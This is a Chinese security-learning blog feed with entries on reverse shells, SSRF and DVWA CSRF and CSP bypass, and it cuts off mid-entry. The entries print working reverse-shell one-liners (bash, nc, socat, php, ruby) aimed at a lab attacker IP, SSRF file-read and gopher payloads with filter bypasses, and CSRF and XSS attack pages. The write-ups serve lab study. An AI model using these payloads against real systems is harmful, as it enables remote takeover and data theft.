    <content type="html"><![CDATA[<p>最近在学习SSRF，遇到了反弹shell，又发现了知识盲区💢💢💢，故来恶补一下🎃🎃🎃</p><h1>定义</h1><p>reverse shell，控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。简而言之就是控制端可以通过执行被控端上的命令并返回到控制端上。</p><h1>用途</h1><p>当控制端通过攻击打开了被控端的一个端口，控制端在自己主机去连接被控端本机叫做正向连接。但是出现以下几种情况时正向连接就很困难：</p><ul><li>被控端被网马连接上，但它在局域网内，无法直接连接</li><li>被控端的ip动态改变</li><li>防火墙限制</li><li>连接的端口被占用</li></ul><p>这时候我们需要指定一个服务端，让受害者主机主动连接服务端程序。但我们还需了解一下反弹shell的核心。</p><h1>Linux||file discriptor</h1><p>在Linux中，当我们打开一个文件，内核为了高效管理已被打开的文件会创建索引用于指代被打开的文件，执行操作系统通过文件描述符进行调用。<strong>Linux下一切皆文件</strong>要对某个设备进行操作，就需要打开此设备的文件，打开文件就会获得该文件的文件描述符 ，每个进程在<code>Process Control  Block</code>中保存着一份文件描述符表，文件描述符就是这个表的索引，每个表项都有一个指向已打开文件的指针。故：</p><ul><li>每个文件描述符会与一个打开的文件相对应</li><li>不同的文件描述符也可能指向同一个文件</li><li>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开</li></ul><p>系统随之创建3个表：</p><ul><li>进程级的文件描述符表</li><li>系统级的文件描述符表</li><li>文件系统的i-node表</li></ul><p>3个表的作用详见:<a href="https://segmentfault.com/a/1190000009724931">文件描述符</a></p><p>当Linux启动的时候会默认打开三个文件描述符：</p><table><thead><tr><th>文件描述符</th><th>缩写</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>标准输入</td></tr><tr><td>1</td><td>STDOUT</td><td>标准输出</td></tr><tr><td>2</td><td>STDERR</td><td>标准错误输出</td></tr></tbody></table><p>每条shell命令，都会继承其父进程的文件描述符，当我们需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p><h1>Redirect</h1><p>重定向主要分为两种</p><ul><li>输入重定向<code> &lt; &lt;&lt;</code></li><li>输出重定向 <code>&gt; &gt;&gt;</code></li></ul><table><thead><tr><th>类型</th><th>符号</th><th>格式</th><th>用法</th></tr></thead><tbody><tr><td>输入重定向</td><td><code> &lt; &lt;&lt;</code></td><td>[n]&lt; word</td><td>将文件描述符 n 重定向到 word 指代的文件（只读）,n默认为0（标准输入）</td></tr><tr><td>输出重定向</td><td><code>&gt; &gt;&gt;</code></td><td>[n]&gt; word</td><td>将文件描述符 n 重定向到word 指代的文件（写），n 默认为 1（标准输出）</td></tr></tbody></table><p>几种常见方式:</p><table><thead><tr><th>重定向方式</th><th>描述</th></tr></thead><tbody><tr><td>301 redirect</td><td>永久性转移，是网页更改地址后对搜索引擎友好的最好方法</td></tr><tr><td>302 redirect</td><td>暂时性转移</td></tr><tr><td>meta fresh</td><td>通过网页中的meta指令，在特定时间后重定向到新的网页，如果延迟的时间太短(约5秒之内)，会被判断为spam。</td></tr></tbody></table><p>bash 在执行一条指令时，会先检查命令中存不存在重定向的符号，如果存在先将文件描述符重定向，然后再把重定向去掉，执行指令（有点优先级的感觉）。如果指令中存在多个重定向，重定向会从左向右解析。</p><p><strong>文件描述符的复制</strong></p><p>格式</p><pre><code class="hljs inform7"><span class="hljs-comment">[n]</span>&lt;&amp;<span class="hljs-comment">[m]</span> （只读）/ <span class="hljs-comment">[n]</span>&gt;&amp;<span class="hljs-comment">[m]</span>（写）</code></pre><p><strong>&amp; 是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件</strong></p><p><strong>exec 绑定重定向</strong></p><p>格式</p><pre><code class="hljs arcade">exec [n] &lt;<span class="hljs-regexp">/&gt; file/</span>[n]</code></pre><p>绑定后只对当前指令有效，如果需要接下来的指令都支持的话就需要再使用 exec 指令。</p><h1>Reverse Shell实例</h1><p>attacker(kali):<code>192.168.67.128</code></p><p>victim(ubuntu)：<code>192.168.67.129</code></p><h2 id="bash"><a class="header-anchor" href="#bash">¶</a>bash</h2><p>在ubuntu执行：</p><p><code>bash -i &gt;&amp; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code></p><p><img src="/2021/02/08/shell/2.png" alt="2"></p><p>在kali监听：</p><p><img src="/2021/02/08/shell/1.jpg" alt="1"></p><p>kali连接到ubuntu的shell。下面我们来推导一下这个命令怎么来的：</p><h4 id="实现输出命令"><a class="header-anchor" href="#实现输出命令">¶</a>实现输出命令</h4><p>在Ubuntu输入字符串</p><p><code>echo genius &gt; /dev/tcp/192.168.67.128/2333</code></p><p>kali上</p><p><img src="/2021/02/08/shell/3.jpg" alt="3"></p><h4 id="实现输入命令"><a class="header-anchor" href="#实现输入命令">¶</a>实现输入命令</h4><p>在kali输入</p><p><img src="/2021/02/08/shell/4.jpg" alt="4"></p><p>在ubuntu输出</p><p><img src="/2021/02/08/shell/5.jpg" alt="5"></p><h4 id="实现交互"><a class="header-anchor" href="#实现交互">¶</a>实现交互</h4><p><code> bash -i &gt; /dev/tcp/192.168.67.128/2333</code></p><p>在ubuntu上的命令会在Kali显示执行结果</p><p>ubuntu</p><p><img src="/2021/02/08/shell/7.jpg" alt="7"></p><p>kali</p><p><img src="/2021/02/08/shell/6.jpg" alt="6"></p><p>但现在kali的命令不能在Ubuntu上执行。还需要：<code>bash -i &lt; /dev/tcp/192.168.67.128/2333</code>将kali的命令输入给ubuntu的bash。</p><p>ubuntu</p><p><img src="/2021/02/08/shell/8.jpg" alt="8"></p><p>现在Kali就可以在ubuntu执行命令了。</p><p>将两条命令结合：<code>bash -i &gt; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code></p><p>kali</p><p><img src="/2021/02/08/shell/9.jpg" alt="9"></p><p>但是在ubuntu上仍有命令</p><p><img src="/2021/02/08/shell/10.jpg" alt="10"></p><p>构造：<code>bash -i &gt; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1 2&gt;&amp;1</code>与最开始的命令<code>bash -i &gt;&amp; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code>等价，测试ubuntu上无回显。成功~~</p><p>也可以exec重定向</p><p><img src="/2021/02/08/shell/11.png" alt="11"></p><p>or</p><pre><code class="hljs angelscript">exec /bin/sh <span class="hljs-number">0</span>&lt;/dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>/<span class="hljs-number">2333</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span></code></pre><h2 id="nc"><a class="header-anchor" href="#nc">¶</a>nc</h2><pre><code class="hljs angelscript">nc -e /bin/bash <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre><h2 id="telent"><a class="header-anchor" href="#telent">¶</a>telent</h2><pre><code class="hljs angelscript">telnet <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span> | /bin/bash | telnet <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre><h2 id="socat"><a class="header-anchor" href="#socat">¶</a>socat</h2><pre><code class="hljs angelscript">socat exec:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>:<span class="hljs-number">2333</span></code></pre><h2 id="php"><a class="header-anchor" href="#php">¶</a>php</h2><pre><code class="hljs tcl">php -r &#x27;$sock=fsockopen(<span class="hljs-string">&quot;192.168.67.128&quot;</span>,<span class="hljs-number">2333</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</code></pre><h2 id="ruby"><a class="header-anchor" href="#ruby">¶</a>ruby</h2><pre><code class="hljs pgsql">ruby -rsocket -<span class="hljs-string">e&#x27;f=TCPSocket.open(&quot;192.168.67.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></code></pre><p>完🚩🚩🚩🚩</p><p>参考：<a href="https://www.cnblogs.com/xiaozi/p/13493010.html">反弹shell的各种姿势</a></p><p><a href="https://xz.aliyun.com/t/2549#toc-0">Linux 反弹shell（二）反弹shell的本质</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2021/02/08/SSRF/"/>
    <url>/2021/02/08/SSRF/</url>
    
    <content type="html"><![CDATA[<p>SSRF(<code>Server-Side Request Forgery</code>:服务器端请求伪造) 由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。（请求由服务端发起，故服务端能请到与自身相连而与外网隔离的内部系统）</p><p><strong>漏洞原理</strong><br>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。常见的有服务端从指定URL地址获取网页文本内容，加载指定地址的图片……SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式：</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用<code>HTTP GET</code>请求就可以实现的攻击(<code>如struts2、SQli等</code>)。</li><li>利用file协议读取本地文件等。</li></ul><p>简而言之就是通过外网网站，访问内部网站，达到攻击内部网站的目的。</p><h2 id="相关危险函数"><a class="header-anchor" href="#相关危险函数">¶</a>相关危险函数</h2><pre><code class="hljs autohotkey">file_get_contents()` / `fsockopen()` / `curl_exec()</code></pre><h4 id="curl-exec"><a class="header-anchor" href="#curl-exec">¶</a>curl_exec()</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params">$url</span>)</span>&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);    curl_exec($ch);    curl_close($ch);&#125;$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];curl($url);</code></pre><h4 id="file-get-contents"><a class="header-anchor" href="#file-get-contents">¶</a>file_get_contents()</h4><pre><code class="hljs bash"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);</code></pre><h4 id="fsockopen"><a class="header-anchor" href="#fsockopen">¶</a>fsockopen()</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getfile</span>(<span class="hljs-params">$host, $port, $link</span>)</span>&#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="hljs-number">30</span>);    <span class="hljs-keyword">if</span>(!$fp)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        $out = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;HOST <span class="hljs-subst">$host</span> \r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;\r\n&quot;</span>;        fwrite($fp, $out);        $content = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">while</span>(!feof($fp))&#123;            $contents .= fgets($fp, <span class="hljs-number">1024</span>);        &#125;        fclose($fp);        <span class="hljs-keyword">return</span> $contents;    &#125;&#125;</code></pre><h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h2><h3 id="curl支持"><a class="header-anchor" href="#curl支持">¶</a>curl支持</h3><p><img src="/2021/02/08/SSRF/1.jpg" alt="1"></p><h3 id="本地利用"><a class="header-anchor" href="#本地利用">¶</a>本地利用</h3><h4 id="file-protocol（任意文件读取）"><a class="header-anchor" href="#file-protocol（任意文件读取）">¶</a>file protocol（任意文件读取）</h4><p>file协议可以避免服务端程序对IP进行过滤</p><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span></code></pre><h4 id="gopher-protocol（一键反弹bash）"><a class="header-anchor" href="#gopher-protocol（一键反弹bash）">¶</a>gopher protocol（一键反弹bash）</h4><p>gopher可以发送各种请求包（故又称万金油），格式:</p><pre><code class="hljs vbnet">curl -vvv <span class="hljs-comment">&#x27;gopher://<span class="hljs-doctag">&lt;host&gt;</span>:<span class="hljs-doctag">&lt;port&gt;</span>/<span class="hljs-doctag">&lt;gopher-path&gt;</span>&#x27;</span></code></pre><p>详见：<a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher协议拓展攻击面</a></p><h4 id="dict-protocol-操作redis"><a class="header-anchor" href="#dict-protocol-操作redis">¶</a>dict protocol(操作redis)</h4><p>dict协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，在SSRF中使用dict协议可以轻易获取目标服务器端口上运行的服务版本等信息。</p><p>格式：</p><pre><code class="hljs vbnet">curl -vvv <span class="hljs-comment">&#x27;dict://<span class="hljs-doctag">&lt;host&gt;</span>:<span class="hljs-doctag">&lt;port&gt;</span>/info&#x27;</span></code></pre><h3 id="远程利用"><a class="header-anchor" href="#远程利用">¶</a>远程利用</h3><h4 id="未作SSRF防御的代码"><a class="header-anchor" href="#未作SSRF防御的代码">¶</a>未作SSRF防御的代码</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params">$url</span>)</span>&#123;                $ch = curl_init();                curl_setopt($ch, CURLOPT_URL, $url);                curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);                 curl_exec($ch);                curl_close($ch); &#125;$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];curl($url);</code></pre><p><strong>利用file协议读取：</strong></p><p><img src="/2021/02/08/SSRF/2.jpg" alt="2"></p><p><strong>利用dict查看端口</strong></p><p><img src="/2021/02/08/SSRF/3.jpg" alt="3"></p><p>端口未开放时就需要用到gopher协议反弹shell，在reverse shell讲了。</p><h4 id="限制协议的代码"><a class="header-anchor" href="#限制协议的代码">¶</a>限制协议的代码</h4><p><img src="/2021/02/08/SSRF/4.png" alt="4"></p><h2 id="SSRF绕过"><a class="header-anchor" href="#SSRF绕过">¶</a>SSRF绕过</h2><h4 id="更改ip"><a class="header-anchor" href="#更改ip">¶</a>更改ip</h4><p>开发者对URL参数进行正则匹配过滤内网IP时，我们可以采用改编IP的写法的方式进行绕过，将ip改写：</p><ul><li>8进制格式</li><li>16进制格式</li><li>10进制整数格式</li><li>16进制整数格式</li><li>合并后两位</li><li>合并后三位</li></ul><p>改写时各个进制可以混用，访问改写后的IP地址时，Apache会报错，但Nginx、MySQL仍正常工作。</p><h4 id="利用解析URL出现的问题"><a class="header-anchor" href="#利用解析URL出现的问题">¶</a>利用解析URL出现的问题</h4><p>当后端程序对访问的URL进行解析，并将解析出来的地址进行过滤。这时候可能会出现对URL参数解析不当，比如 <code>http://www.baidu.com@192.168.67.129</code>  当后端程序通过不正确的正则表达式，比如解析到http之后到com为止的字符内容时，<a href="http://xn--URLhostwww-xx2pha710ae15suhwcnmaj19l.baidu.com">会认为访问URL的host为www.baidu.com</a>，但实际上这个URL所请求的内容是192.168.67.129上的</p><h4 id="利用跳转"><a class="header-anchor" href="#利用跳转">¶</a>利用跳转</h4><p>URL的host被正确解析并过滤时，可使用跳转进行绕过，如 <a href="http://xxx/redirect-to?url=http://192.168.67.129">http://xxx/redirect-to?url=http://192.168.67.129</a> ，但是192.168.67.129可能会被正则表达式过滤，可以通过短地址绕过。常用302跳转和307跳转（reverse shell讲过）</p><h4 id="协议绕过"><a class="header-anchor" href="#协议绕过">¶</a>协议绕过</h4><p>除了上面讲到的file,gopher，dict协议还有以下几种：</p><pre><code class="hljs awk">SFTP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=sftp:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/TFTP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=tftp:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/TESTUDPPACKETLDAP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=ldap:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquit</code></pre><h4 id="利用特殊域名"><a class="header-anchor" href="#利用特殊域名">¶</a>利用特殊域名</h4><p>原理是DNS解析</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">67.129</span>.xip.io<span class="hljs-regexp">/   /</span><span class="hljs-regexp">/自动重定向到192.168.67.129</span></code></pre><h4 id="IPv6"><a class="header-anchor" href="#IPv6">¶</a>IPv6</h4><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code> 或IPv6的内网域名来绕过过滤</p><h4 id="IDN"><a class="header-anchor" href="#IDN">¶</a>IDN</h4><p>一些网络访问工具支持国际化域名(特殊字符域名)，指部分或完全使用特殊的文字或字母组成的互联网域名。部分字符会在访问时做一个等价转换</p><pre><code class="hljs avrasm">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<span class="hljs-symbol">such:</span>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre><h4 id="利用句号"><a class="header-anchor" href="#利用句号">¶</a>利用句号</h4><pre><code class="hljs angelscript"><span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>  &gt;&gt;&gt;  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span></code></pre><h4 id="DNS-重绑"><a class="header-anchor" href="#DNS-重绑">¶</a>DNS 重绑</h4><p>用户请求的URL参数时，服务器端会先对其进行DNS解析，再对DNS Server返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。请求DNS服务进行域名解析到服务端请求URL之间存在一个时间差，利用这个时间差，进行DNS重绑定攻击。流程如下:</p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="利用特殊地址"><a class="header-anchor" href="#利用特殊地址">¶</a>利用特殊地址</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/</code></pre><p><strong>以上绕过方式也可以组合进行绕过</strong></p><h2 id="防御方式"><a class="header-anchor" href="#防御方式">¶</a>防御方式</h2><ul><li>过滤返回的信息</li><li>限制协议为HTTP，HTTPS</li><li>统一错误信息</li><li>限制请求的端口</li><li>限制302重定向</li><li>考虑使用DNS缓存或者Host白名单</li></ul><p>完🍓🍓🍓</p><p>参考：<a href="https://www.cnblogs.com/iors/p/9777571.html">SSRF漏洞攻击与防御</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">SSRF</a></p><p><a href="https://www.secpulse.com/archives/65832.html">SSRF绕过总结</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||CSRF</title>
    <link href="/2021/02/03/dvwa6/"/>
    <url>/2021/02/03/dvwa6/</url>
    
    <content type="html"><![CDATA[<p>CSRF，全称Cross-site request forgery，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS区别在于CSRF并没有盗取cookie而是直接利用。</p><p>举个栗子🌞🌞🌞：</p><p>A要汇八万给B，A可以通过对银行的网站发送请求<code>http://bank/account=A&amp;amout=80000&amp;receive=B</code>(假设)这时候C想得到这八万，他就可以先自己做一个网站，在网站中放入如下代码：  <code>http://bank/account=A&amp;amount=80000&amp;receive=C</code>，然后通过广告或者链接诱使 A 来访问他的网站。当 A 访问该网站时，上述 url 就会从 A 的浏览器发向银行，而这个请求会附带  A浏览器中的 cookie 一起发向银行服务器。多数情况下，请求会失败，因为他会验证 A的信息，但如果 A  当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 A 的认证信息。这时， url 请求就会得到响应，钱将从A的账号转移到C 的账号，而 A不知情。即使A去银行查询记录，也只能发现有一个来自于他本人的合法请求转移了资金。（就很惨，不过现在的银行的网站应该没有这种漏洞吧👏👏👏）</p><p><strong>CSRF漏洞检测</strong></p><p>抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，则存在CSRF漏洞。也可以借助工具</p><p>检测工具:<code>CSRFTester</code>，<code>CSRF Request Builder</code>.</p><h1>low</h1><p><img src="/2021/02/03/dvwa6/1.jpg" alt="1"></p><p>没有防御CSRF</p><p>在页面更改密码发现网址<code>http://localhost/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code>但不能直接放这个网址（可以用在线工具将网址变短)去诱导别人点击（谁那么傻)所以要委婉一点:</p><p>先在我的虚拟机(模拟一下攻击者的主机)上写个网页:</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></code></pre><p>然后再物理机上访问它（模拟受害者）</p><p><img src="/2021/02/03/dvwa6/2.jpg" alt="2"></p><p>然后查看一下管理员的密码</p><p><img src="/2021/02/03/dvwa6/3.jpg" alt="3"></p><p>解码</p><p><img src="/2021/02/03/dvwa6/4.jpg" alt="4"></p><p>密码就被改辽。也可以抓包改网址处理</p><h1>medium</h1><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>( stripos( $_SERVER[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> )</code></pre><p>增加了对用户请求头的中的Referer字段的校验，请求头中的Referer字段必须包含主机地址。</p><p><img src="/2021/02/03/dvwa6/7.jpg" alt="7"></p><p>只要包含了主机地址就可以绕过，所以构造的文件名为：<code>127.0.0.1.html</code>即可绕过。也可在burp中<code>CSRF POC</code>模块中更改。</p><h1>high</h1><p>代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求（之前介绍过)token值被放到url最后。本关解题关键是利用用户的cookie去修改密码的页面获取关键的token。构造一个攻击页面，引诱受害者访问(PS:这个攻击代码是去教程copy的，等我系统学习一下JavaScript在来自己写一个,不过里面用到的函数，标签，语法在dvwa||XSS和dvwa||CSP Bypass都讲过了)</p><pre><code class="hljs pgsql">&lt;script <span class="hljs-keyword">type</span>=&quot;text/javascript&quot;&gt;    <span class="hljs-keyword">function</span> attack()&#123;        document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>;        document.getElementById(&quot;transfer&quot;).submit();     &#125;&lt;/script&gt;&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;    &lt;form <span class="hljs-keyword">method</span>=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;password_new&quot; <span class="hljs-keyword">value</span>=&quot;password&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;password_conf&quot; <span class="hljs-keyword">value</span>=&quot;password&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;user_token&quot; <span class="hljs-keyword">value</span>=&quot;&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;Change&quot; <span class="hljs-keyword">value</span>=&quot;Change&quot;&gt;    &lt;/form&gt;&lt;/body&gt;</code></pre><p>因为浏览器不允许跨域，而用户的服务器在本地端，攻击者在另一个服务器(我的虚拟机里)，当用户主动发送信息给攻击者的服务器时，攻击脚本才可能获取token令牌。这就要结合之前学的XSS辽，在XSS的high中输入 <code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName('user_token')[0].value)&gt; </code>，即可获取token。参考：<a href="https://www.cnblogs.com/zhengna/p/12736823.html">high-绕过token</a>。</p><h1>impossible</h1><p>本关要求输入之前的密码，CSRF就有点困难了，除非攻击者能得到用户当前密码。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||CSP Bypass</title>
    <link href="/2021/02/02/dvwa9/"/>
    <url>/2021/02/02/dvwa9/</url>
    
    <content type="html"><![CDATA[<p>Content-Security-Policy（内容安全策略）是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。是为了缓解潜在的跨站脚本问题（XSS）原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。开发者只需要提供配置，实现和执行全部由浏览器完成。简而言之就是在前端添加一些标签，告诉浏览器哪些资源可以加载访问。我们今天要做的就是绕过他。</p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>源码列了几个白名单网站</p><p><img src="/2021/02/02/dvwa9/8.jpg" alt="8"></p><p>我们可以在白名单网站写js代码如<code>alert(111)</code>得到<code>https://pastebin.com/5WMivnEr</code>，在dvwa页面进行访问，理论上就会达到注入效果，但是现在的火狐好像被修复了</p><p><img src="/2021/02/02/dvwa9/9.jpg" alt="9"></p><p>其实这关也可以用CSRF实现，还是一样通过做钓鱼网站来实现。</p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p><img src="/2021/02/02/dvwa9/1.jpg" alt="1"></p><p>构造：<code>&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot; &gt; alert(&#39;xss&#39;)&lt;/script&gt;</code><img 